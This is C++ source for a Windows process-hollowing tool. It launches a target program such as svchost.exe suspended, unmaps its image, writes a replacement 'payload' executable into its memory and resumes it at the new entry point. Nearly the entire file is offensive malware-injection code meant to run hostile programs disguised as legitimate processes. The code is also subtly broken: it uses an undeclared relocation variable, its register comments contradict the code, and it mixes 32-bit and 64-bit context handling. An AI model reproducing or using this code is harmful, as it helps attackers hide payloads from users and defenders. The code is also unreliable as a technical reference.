#include <windows.h>
#include <iostream>
#include <vector>

class ProcessHollower {
private:
    HANDLE m_hProcess;
    HANDLE m_hThread;
    DWORD m_Pid;
    CONTEXT m_Context;
    
    BOOL GetExeInfo(LPCSTR ExePath, PIMAGE_DOS_HEADER* pDosHeader, 
                    PIMAGE_NT_HEADERS* pNtHeaders, std::vector<BYTE>* pExeData) {
        // Read file
        HANDLE hFile = CreateFileA(ExePath, GENERIC_READ, FILE_SHARE_READ,
                                   NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        
        if (hFile == INVALID_HANDLE_VALUE) {
            return FALSE;
        }
        
        DWORD FileSize = GetFileSize(hFile, NULL);
        pExeData->resize(FileSize);
        
        DWORD BytesRead = 0;
        ReadFile(hFile, pExeData->data(), FileSize, &BytesRead, NULL);
        CloseHandle(hFile);
        
        // Parse headers
        *pDosHeader = (PIMAGE_DOS_HEADER)pExeData->data();
        
        if ((*pDosHeader)->e_magic != IMAGE_DOS_SIGNATURE) {
            return FALSE;
        }
        
        *pNtHeaders = (PIMAGE_NT_HEADERS)(pExeData->data() + (*pDosHeader)->e_lfanew);
        
        if ((*pNtHeaders)->Signature != IMAGE_NT_SIGNATURE) {
            return FALSE;
        }
        
        return TRUE;
    }
    
public:
    ProcessHollower() : m_hProcess(NULL), m_hThread(NULL), m_Pid(0) {
        memset(&m_Context, 0, sizeof(CONTEXT));
        m_Context.ContextFlags = CONTEXT_FULL;
    }
    
    ~ProcessHollower() {
        if (m_hThread) CloseHandle(m_hThread);
        if (m_hProcess) CloseHandle(m_hProcess);
    }
    
    BOOL HollowProcess(LPCSTR TargetExe, LPCSTR ReplacementExe) {
        // Create suspended process
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        
        if (!CreateProcessA(TargetExe, NULL, NULL, NULL, FALSE,
                           CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            printf("[!] Failed to create suspended process. Error: %d\n", GetLastError());
            return FALSE;
        }
        
        m_hProcess = pi.hProcess;
        m_hThread = pi.hThread;
        m_Pid = pi.dwProcessId;
        
        printf("[*] Created suspended process PID: %d\n", m_Pid);
        
        // Get target process entry point
        if (!GetThreadContext(m_hThread, &m_Context)) {
            printf("[!] Failed to get thread context. Error: %d\n", GetLastError());
            return FALSE;
        }
        
        // Read replacement executable
        PIMAGE_DOS_HEADER pDosHeader = NULL;
        PIMAGE_NT_HEADERS pNtHeaders = NULL;
        std::vector<BYTE> ExeData;
        
        if (!GetExeInfo(ReplacementExe, &pDosHeader, &pNtHeaders, &ExeData)) {
            printf("[!] Failed to read replacement EXE\n");
            return FALSE;
        }
        
        // Get entry point
        DWORD dwEntryPoint = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
        DWORD dwImageBase = pNtHeaders->OptionalHeader.ImageBase;
        DWORD dwImageSize = pNtHeaders->OptionalHeader.SizeOfImage;
        
        printf("[*] Replacement image base: 0x%X\n", dwImageBase);
        printf("[*] Replacement entry point: 0x%X\n", dwEntryPoint);
        
        // Unmap original executable
        PVOID pBaseAddress = (PVOID)dwImageBase;
        
        // Calculate actual base address from PEB
        // Get PEB from context
        DWORD_PTR pPEB = m_Context.Rdx; // x64: RCX = PEB pointer
        
        SIZE_T BytesRead = 0;
        DWORD_PTR pImageBaseAddress = 0;
        
        // Read PEB->ImageBaseAddress (offset 0x08)
        ReadProcessMemory(m_hProcess, (LPCVOID)(pPEB + 0x08), 
                         &pImageBaseAddress, sizeof(pImageBaseAddress), &BytesRead);
        
        printf("[*] Target image base: 0x%llX\n", pImageBaseAddress);
        
        // Unmap original
        if (pImageBaseAddress) {
            HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
            FARPROC pNtUnmapViewOfSection = GetProcAddress(hNtdll, "NtUnmapViewOfSection");
            
            ((NTSTATUS(NTAPI*)(HANDLE, PVOID))pNtUnmapViewOfSection)(m_hProcess, (PVOID)pImageBaseAddress);
        }
        
        // Allocate new memory
        PVOID pNewBase = VirtualAllocEx(m_hProcess, (LPVOID)dwImageBase, dwImageSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        if (!pNewBase) {
            // Try to allocate at different address if preferred base is taken
            pNewBase = VirtualAllocEx(m_hProcess, NULL, dwImageSize,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            
            if (!pNewBase) {
                printf("[!] Failed to allocate memory in target. Error: %d\n", GetLastError());
                return FALSE;
            }
            
            // Update delta for relocation
            dwDelta = (DWORD_PTR)pNewBase - dwImageBase;
        }
        
        printf("[*] Allocated at: 0x%p\n", pNewBase);
        
        // Write headers
        WriteProcessMemory(m_hProcess, pNewBase, ExeData.data(),
                          pNtHeaders->OptionalHeader.SizeOfHeaders, &BytesRead);
        
        // Write sections
        PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
        
        for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
            if (pSection->SizeOfRawData) {
                WriteProcessMemory(m_hProcess, (PBYTE)pNewBase + pSection->VirtualAddress,
                                  ExeData.data() + pSection->PointerToRawData,
                                  pSection->SizeOfRawData, &BytesRead);
            }
            pSection++;
        }
        
        // Set new entry point
        DWORD_PTR dwNewEntryPoint = (DWORD_PTR)pNewBase + dwEntryPoint;
        
        // Update thread context
        m_Context.Rcx = (DWORD_PTR)pNewBase;          // RCX = ImageBase for DllMain
        m_Context.Rdx = (DWORD_PTR)DLL_PROCESS_ATTACH; // RDX = Reason
        m_Context.R8 = 0;                             // R8 = Reserved
        
        #ifdef _WIN64
        m_Context.Rip = dwNewEntryPoint;
        #else
        m_Context.Eax = dwNewEntryPoint;
        #endif
        
        if (!SetThreadContext(m_hThread, &m_Context)) {
            printf("[!] Failed to set thread context. Error: %d\n", GetLastError());
            return FALSE;
        }
        
        // Resume thread
        ResumeThread(m_hThread);
        
        printf("[+] Process hollowing successful!\n");
        
        return TRUE;
    }
};

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("   Process Hollowing Tool\n");
    printf("========================================\n\n");
    
    if (argc < 3) {
        printf("Usage: %s <target.exe> <replacement.exe>\n", argv[0]);
        printf("Example: %s svchost.exe payload.exe\n", argv[0]);
        system("pause");
        return 1;
    }
    
    ProcessHollower Hollow;
    
    if (Hollow.HollowProcess(argv[1], argv[2])) {
        printf("[+] Process hollowed successfully\n");
    } else {
        printf("[!] Process hollowing failed\n");
    }
    
    system("pause");
    return 0;
}